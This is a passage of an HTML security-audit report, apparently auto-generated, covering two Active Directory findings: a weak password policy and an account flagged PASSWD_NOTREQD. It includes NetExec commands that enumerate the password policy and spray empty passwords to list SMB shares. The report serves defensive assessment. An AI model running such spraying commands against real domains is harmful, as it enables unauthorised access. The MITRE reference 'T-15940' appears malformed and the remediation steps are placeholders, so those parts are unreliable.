                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://www.netwrix.com/password-policy-best-practices.html">Link 1</a></p>
                                                    <p><a href="https://learn.microsoft.com/en-GB/entra/identity/authentication/concept-password-ban-bad-on-premises">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Low-privileged users can enumerate the password policy for the domain. If a low password history is not set, a user can reset their password multiple times cycling through the passwordhistory and set an older password, which may be reused across other systems and is more likely to be compromised.</p>
                                                            <p class="code">nxc smb dc.test.local -u test -p 'Password123!' --pass-pol</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/passwordpolicy.png" alt="Finding weak password policy">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Improve the password policy</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Disabled-account-does-not-require-a-password"><u>Disabled account does not require a password</u></td>
                            <td class="finding-riskLOW">LOW</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>User account may have a blank password set (PASSWD_NOTREQD).</td>
                                                <td>T-15940</td>
                                                <td>+5</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                <tr><td class="grey">Users</td><td>MOHAMMAD_ALBERT</td></tr>                    <tr><td class="grey">PASSWD_NOTREQD</td><td>True</td></tr>
                            <tr><td class="grey">Enabled</td><td>False</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Users with the PASSWD_NOTREQD attribute set in Active Directory may have a blank password set This means simply knowing the account username will be enough to login and authenticte as that user, providing an attacker unauthenticatd access to the domain.</p>
                                                    <p>1 users do not require a password but are disabled</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://specopssoft.com/blog/find-ad-accounts-using-password-not-required-blank-password/">Link 1</a></p>
                                                    <p><a href="https://activedirectorypro.com/find-accounts-with-password-not-required-blank-password/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. An unauthenticated attacker can spray empty passwords against users in the hopes that some have blank passwords set. This allows an unauthorised attacker access to the same domain resources as an authenticated user, giivng a foothold to escalate within the domain.</p>
                                                            <p class="code">nxc smb dc.test.local -u emptypasswd -p '' --shares</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/pwdnotrequired.png" alt="Finding users without a password required">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Remove PASSWD_NOTREQD attribute from all users</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr></tbody></table></div>

                                                    <!-- js to drop down each finding-->
                                                    <script>
                                                        // Get all the rows with class "toggle"
                                                        var toggles = document.querySelectorAll('.toggle');

                                                        // Add event listener to each toggle row
                                                        toggles.forEach(function (toggle) {
                                                            toggle.addEventListener('click', function () {
                                                                // Toggle the visibility of the next sibling element with class "finding"
                                                                var finding = this.parentNode.nextElementSibling;
                                                                finding.style.display = (finding.style.display === 'table-row') ? 'none' : 'table-row';
                                                            });
                                                        });
                                                    </script>
</body>

</html>